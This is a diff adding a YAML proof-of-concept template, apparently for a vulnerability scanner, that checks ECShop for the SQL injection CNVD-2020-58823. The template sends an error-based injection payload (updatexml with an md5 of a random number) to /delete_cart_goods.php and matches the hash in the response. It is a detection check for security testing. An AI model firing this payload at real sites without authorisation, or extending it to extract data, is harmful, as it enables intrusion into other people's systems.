@@ -1,0 +1,17 @@
+expression: r0()
+id: CNVD-2020-58823
+info:
+  author: "\u51C9\u98CE(http://webkiller.cn/)"
+  name: ecshop-CNVD-2020-58823-sqli
+  severity: high
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)),
+      0, 31)))
+    request:
+      body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
+      method: POST
+      path: /delete_cart_goods.php
+set:
+  r1: randomInt(40000, 44800)
